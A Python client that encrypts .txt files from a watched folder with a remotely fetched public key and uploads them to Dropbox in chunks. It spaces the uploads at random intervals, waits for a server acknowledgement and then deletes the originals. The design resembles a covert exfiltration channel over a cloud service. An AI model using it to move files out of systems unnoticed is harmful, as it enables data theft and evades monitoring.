import os
import asyncio
import base64
import requests
import random
import hashlib
import dropbox
from dotenv import load_dotenv, find_dotenv
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.fernet import Fernet

load_dotenv(find_dotenv())

APP_KEY = os.getenv("DROPBOX_APP_KEY")
APP_SECRET = os.getenv("DROPBOX_APP_SECRET")
REFRESH_TOKEN = os.getenv("DROPBOX_REFRESH_TOKEN")
TARGET_FOLDER = os.getenv("TARGET_FOLDER")
PUBLIC_KEY_URL = os.getenv("PUBLIC_KEY_URL")

dbx = dropbox.Dropbox(app_key=APP_KEY, app_secret=APP_SECRET, oauth2_refresh_token=REFRESH_TOKEN)

def get_public_key():
    response = requests.get(PUBLIC_KEY_URL)
    return serialization.load_pem_public_key(response.content)

def hybrid_encrypt_data(data, public_key):
    aes_key = Fernet.generate_key()
    cipher_aes = Fernet(aes_key)
    encrypted_data = cipher_aes.encrypt(data)
    enc_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    return enc_aes_key + encrypted_data

def get_file_hash(data):
    return hashlib.sha256(data).hexdigest()

async def wait_for_ack(file_id):
    ack_path = f"/SUCCESS_{file_id}.ack"
    print(f"[*] Очікую підтвердження від сервера для {file_id}...")
    
    for _ in range(20):
        try:
            dbx.files_get_metadata(ack_path)
            print(f"\n[SERVER PING] ===> Сервер отримав і розшифрував файл {file_id}! <===\n")
            dbx.files_delete_v2(ack_path)
            return True
        except:
            await asyncio.sleep(10)
    return False

async def main_loop(public_key):
    print("[+] Клієнт Dropbox (Refresh Token Mode) запущено.")
    if not os.path.exists(TARGET_FOLDER): os.makedirs(TARGET_FOLDER)

    while True:
        for filename in os.listdir(TARGET_FOLDER):
            if filename.endswith(".txt"):
                filepath = os.path.join(TARGET_FOLDER, filename)
                print(f"[*] Обробка: {filename}")
                
                with open(filepath, "rb") as f: data = f.read()
                file_hash = get_file_hash(data)
                encrypted_binary = hybrid_encrypt_data(data, public_key)
                b64_text = base64.b64encode(encrypted_binary).decode('utf-8')

                CHUNK_SIZE = 3000
                parts = [b64_text[i:i + CHUNK_SIZE] for i in range(0, len(b64_text), CHUNK_SIZE)]
                file_id = os.urandom(4).hex()

                for idx, chunk in enumerate(parts):
                    cloud_path = f"/{file_id}_{idx}_{len(parts)}_{file_hash}.dat"
                    try:
                        dbx.files_upload(chunk.encode(), cloud_path)
                        print(f"[>] Dropbox: шматок {idx+1}/{len(parts)} завантажено.")
                    except Exception as e:
                        print(f"[-] Помилка: {e}")
                    await asyncio.sleep(random.uniform(1.0, 3.0))

                if await wait_for_ack(file_id):
                    os.remove(filepath)
                    print(f"[+] Файл {filename} успішно передано і видалено.")
        
        await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main_loop(get_public_key()))